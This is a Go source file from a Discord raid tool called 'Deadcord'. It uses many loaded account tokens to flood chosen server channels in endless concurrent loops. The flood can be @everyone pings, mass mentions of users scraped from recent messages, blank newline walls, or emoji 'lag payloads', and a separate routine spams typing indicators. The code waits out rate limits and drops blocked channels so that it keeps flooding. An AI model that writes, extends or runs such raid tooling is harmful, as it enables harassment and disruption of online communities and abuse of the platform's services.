package modules

import (
	"Deadcord/core"
	"Deadcord/requests"
	"Deadcord/util"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"strconv"
	"strings"
	"sync"
)

var (
	MesasgeToSpam = ""
	FoundUsers    []string
)

func StartSpamThreads(server_id string, channels string, messages []string, mode int, tts bool) int {
	channels_found := strings.Split(channels, ",")

	if len(channels_found) == 0 {
		return 3
	}

	for _, message := range messages {
		if len(message) > 1990 {
			return 1
		}
	}

	if len(channels_found) == 0 {
		return 2
	}

	var wg sync.WaitGroup
	wg.Add(len(core.RawTokensLoaded))
	for _, token := range core.RawTokensLoaded {
		go func(server_id string, token string, channels []string, messages []string, mode int, tts bool) {
			if InServer(server_id, token) {
				if mode == 3 {
					for _, channel := range channels_found {
						messages, _ := GetMessages(channel, 50, token)
						if len(messages) > 0 {
							FoundUsers = scrapeBasic(messages)
						}
					}
				}

				spamWorker(token, channels_found, messages, mode, tts)
			} else {
				util.WriteToConsole("Token not in server, skipping spam thread.", 1)
			}
		}(server_id, token, channels_found, messages, mode, tts)
	}

	return 0
}

func StartTypingSpamThreads(channel_id string) {
	var wg sync.WaitGroup
	wg.Add(len(core.RawTokensLoaded))
	for _, token := range core.RawTokensLoaded {
		go func(channel_id string, token string) {
			typingWorker(channel_id, token)
		}(channel_id, token)
	}
}

func spamWorker(token string, channels []string, messages []string, mode int, tts bool) {

	random_message := messages[rand.Intn(len(messages))]
	used_channels := channels

	built_message := ""

	switch mode {
	case 1:
		built_message = random_message
	case 2:
		built_message = "@everyone " + random_message
	case 3:
		built_message = strings.Join(FoundUsers[:], " ")
	case 4:
		var blank_payload strings.Builder
		for i := 0; i < 250; i++ {
			blank_payload.WriteString("\n")
		}

		built_message = "\u200e" + blank_payload.String() + "\u200e"
	case 5:
		var lag_payload strings.Builder
		for i := 0; i < 250; i++ {
			lag_payload.WriteString(":chains:")
		}

		built_message = lag_payload.String()
	}

	for {
		for channel_key, channel_id := range used_channels {

			if core.ActionFlag == 1 {
				return
			}

			status, status_code, message_json := BotMessage(token, channel_id, built_message, false)

			if status {
				var message core.RateLimit
				if err := json.Unmarshal(message_json, &message); err != nil {
					log.Fatal(err)
				}

				switch status_code {
				case 429:
					retry_when := int(message.RetryAfter)
					pause_time_string := strconv.Itoa(retry_when)

					if retry_when > 1 {
						util.WriteToConsole("Thread Paused: "+pause_time_string+" seconds.", 1)
					}

					util.Sleep(retry_when)
				case 403:
					util.WriteToConsole("Channel unavailable, removing channel.", 3)
					util.RemoveFromSlice(used_channels, channel_key)
				case 404:
					util.WriteToConsole("Channel not found in guild, removing channel.", 3)
					fmt.Println(string(message_json[:]))
					util.RemoveFromSlice(used_channels, channel_key)
				}
			}
		}
	}
}

func typingWorker(channel_id string, token string) {
	for {
		if core.ActionFlag == 1 {
			return
		}

		status, _, _ := requests.SendDiscordRequest("channels/"+channel_id+"/typing", "POST", token, map[string]interface{}{}, map[string]interface{}{})

		if status {
			util.Sleep(9)
		}
	}
}

func BotMessage(token string, channel string, message string, tts bool) (bool, int, []byte) {
	status, status_code, message_response := requests.SendDiscordRequest("channels/"+channel+"/messages", "POST", token, map[string]interface{}{}, map[string]interface{}{
		"content": message,
		"tts":     tts,
		"nonce":   requests.GetNonce(),
	})

	return status, status_code, message_response
}

func scrapeBasic(message_objects []byte) []string {
	var scraped_users []string
	if message_objects != nil {
		var message_data core.GuildMessages
		if err := json.Unmarshal(message_objects, &message_data); err != nil {
			log.Fatal(err)
		}

		for _, data := range message_data {
			author_id := data.Author.ID
			if len(FoundUsers) < 40 {
				template_id := "<@" + author_id + ">"
				if !util.Contains(scraped_users, template_id) {
					scraped_users = append(scraped_users, template_id)
				}
			} else {
				continue
			}
		}
	} else {
		return nil
	}

	return scraped_users
}
